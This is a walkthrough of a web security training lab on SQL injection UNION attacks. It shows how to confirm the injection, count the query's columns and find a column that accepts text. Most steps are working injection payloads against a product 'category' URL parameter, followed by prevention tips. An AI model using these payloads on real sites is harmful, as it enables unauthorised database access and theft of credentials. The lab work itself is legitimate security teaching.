# 🔍 Lab Walkthrough: SQL Injection UNION Attack — Finding a Column Containing Text

> **Lab Title:** SQL injection UNION attack, finding a column containing text

> **Difficulty:** Practitioner

> **Status:** 🧪 solved

> **Goal:** Identify which column in the query can hold string data by injecting a test value.



## 🎯 Objective

In this lab, you must:
- Determine how many **columns** are returned by the original query
- Find out **which column accepts string values**
- Inject a **random string** provided by the lab to confirm it's visible in the app response

This step is crucial for later stages where you'll extract sensitive data like usernames, passwords, or flags via `UNION SELECT`.



## 🛠 Step-by-Step Guide

### 🔹 Step 1: Locate the Vulnerable Input

The vulnerable input is the **product category filter**, usually passed as a parameter in the URL:

```
GET /filter?category=Electronics
```

You suspect the backend runs a query like:

```sql
SELECT name, description, price FROM products WHERE category = 'Electronics'
```

So your job is to **inject into the `category` parameter**.


### 🔹 Step 2: Confirm SQLi Vulnerability

Try breaking the query with a single quote:

```
GET /filter?category=Electronics'
```

➡️ If the page errors or behaves oddly → Vulnerable ✅

Now try bypassing the rest of the query:

```
GET /filter?category=Electronics'--
```

➡️ If it loads normally → Injection confirmed ✅



### 🔹 Step 3: Determine Number of Columns

Use the `UNION SELECT NULL` method to find the number of columns:

Try this payload:

```
GET /filter?category='+UNION+SELECT+NULL,NULL,NULL--
```

✅ If no error and an extra row appears → The query returns **3 columns**



### 🔹 Step 4: Test Which Column Accepts String Data

Now inject a **test string** (like `'gvWwT5'`) into each column one at a time. This helps determine which column can display string-based data (e.g., usernames, secrets).

#### Try These Payloads:

1. Inject into the **first column**:
```
GET /filter?category='+UNION+SELECT+'gvWwT5',NULL,NULL--
```

2. Inject into the **second column**:
```
GET /filter?category='+UNION+SELECT+NULL,'gvWwT5',NULL--
```

3. Inject into the **third column**:
```
GET /filter?category='+UNION+SELECT+NULL,NULL,'gvWwT5'--
```

👀 Look for where `'gvWwT5'` appears on the page — that tells you which column accepts string values.



## 🧩 Example Lab Solution

Let’s say the lab gives you the random string: `gvWwT5`

Try this payload:

```
GET /filter?category='+UNION+SELECT+NULL,'gvWwT5',NULL--
```

✅ If `gvWwT5` appears in the second column of the response → You’ve found a usable column!



## 📊 Summary Table

| Column | Payload | Result |
|--------|---------|--------|
| 1st | `' UNION SELECT 'gvWwT5',NULL,NULL--` | ❌ Error or not shown |
| 2nd | `' UNION SELECT NULL,'gvWwT5',NULL--` | ✅ Value appears |
| 3rd | `' UNION SELECT NULL,NULL,'gvWwT5'--` | ❌ Error or not shown |

📌 **Conclusion:** The **second column** accepts string values — use it for extracting real data next.



## 💡 Why This Matters

Knowing which column accepts strings allows you to:
- Extract usernames, passwords, API keys, etc.
- Read version info (`@@version`, `version()`)
- Retrieve internal flags or tokens

Without this step, even if you know the number of columns, you won’t be able to see meaningful results from your injections.


## 🛡️ Prevention Tips

To avoid this kind of vulnerability in production apps:

- ✅ Use **parameterized queries** (no string concatenation!)
- ✅ Sanitize and validate all user inputs
- ✅ Avoid displaying raw database errors to users
- ✅ Limit what the application's DB user can do
- ✅ Use a Web Application Firewall (WAF) to detect common SQLi patterns


## 🧠 Bonus: What Happens Behind the Scenes?

When you inject a string like `'gvWwT5'` into a numeric column (e.g., `INT`), the database tries to convert the string to a number and fails:

```sql
Conversion failed when converting the varchar value 'gvWwT5' to data type int.
```

But if the column accepts strings (like `VARCHAR`, `TEXT`), it displays your injected value without issue.

That’s how you identify a usable column.


